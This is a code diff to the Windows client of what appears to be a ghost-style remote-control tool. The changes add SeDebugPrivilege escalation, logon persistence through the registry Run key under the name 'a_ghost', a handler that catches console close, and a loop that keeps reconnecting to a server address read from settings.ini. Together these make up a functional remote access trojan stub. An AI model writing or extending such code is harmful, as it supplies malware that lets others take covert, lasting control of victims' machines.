@@ -12,12 +12,38 @@ StopRun stop = NULL;
 // 是否成功停止
 IsStoped bStop = NULL;
 
+// 是否退出被控端
+IsStoped bExit = NULL;
+
+BOOL status = 0;
+
 struct CONNECT_ADDRESS
 {
 	DWORD dwFlag;
 	char  szServerIP[MAX_PATH];
 	int   iPort;
 }g_ConnectAddress={0x1234567,"",0};
+
+//提升权限
+void DebugPrivilege()
+{
+	HANDLE hToken = NULL;
+	//打开当前进程的访问令牌
+	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);
+
+	if( hRet)
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		//取得描述权限的LUID
+		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		//调整访问令牌的权限
+		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
+
+		CloseHandle(hToken);
+	}
+}
 
 /** 
 * @brief 设置本身开机自启动
@@ -30,6 +56,8 @@ struct CONNECT_ADDRESS
 */
 BOOL SetSelfStart(const char *sPath, const char *sNmae)
 {
+	DebugPrivilege();
+
 	// 写入的注册表路径
 #define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
 
@@ -50,12 +78,26 @@ BOOL SetSelfStart(const char *sPath, const char *sNmae)
 	return lRet == ERROR_SUCCESS;
 }
 
+BOOL CALLBACK callback(DWORD CtrlType)
+{
+	if (CtrlType == CTRL_CLOSE_EVENT)
+	{
+		status = 1;
+		if(stop) stop();
+		while(1==status)
+			Sleep(20);
+	}
+	return TRUE;
+}
+
 int main(int argc, const char *argv[])
 {
 	if(!SetSelfStart(argv[0], "a_ghost"))
 	{
-		std::cout<<"设置开机自启动失败.\n";
+		std::cout<<"设置开机自启动失败，请用管理员权限运行.\n";
 	}
+	status = 0;
+	SetConsoleCtrlHandler(&callback, TRUE);
 	char path[_MAX_PATH], *p = path;
 	GetModuleFileNameA(NULL, path, sizeof(path));
 	while (*p) ++p;
@@ -66,23 +108,28 @@ int main(int argc, const char *argv[])
 	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
 	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
 	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
+	bExit = hDll ? IsStoped(GetProcAddress(hDll, "IsExit")) : NULL;
 	if (run)
 	{
 		char *ip = g_ConnectAddress.szServerIP;
 		int &port = g_ConnectAddress.iPort;
 		if (0 == strlen(ip))
 		{
-			strcpy(p+1, "remote.ini");
-			GetPrivateProfileStringA("remote", "ip", "127.0.0.1", ip, _MAX_PATH, path);
-			port = GetPrivateProfileIntA("remote", "port", 2356, path);
+			strcpy(p+1, "settings.ini");
+			GetPrivateProfileStringA("settings", "localIp", "127.0.0.1", ip, _MAX_PATH, path);
+			port = GetPrivateProfileIntA("settings", "ghost", 2356, path);
 		}
-		printf("[remote] %s:%d\n", ip, port);
-		run(ip, port);
-#ifdef _DEBUG
-		while(1){ char ch[64]; std::cin>>ch; if (ch[0]=='q'){ break; } }
-		if (stop) stop();
-		while(bStop && !bStop()) Sleep(200);
-#endif
+		printf("[server] %s:%d\n", ip, port);
+		do 
+		{
+			run(ip, port);
+			while(bStop && !bStop() && 0 == status)
+				Sleep(20);
+		} while (bExit && !bExit() && 0 == status);
+
+		while(bStop && !bStop() && 1 == status)
+			Sleep(20);
 	}
+	status = 0;
 	return -1;
 }
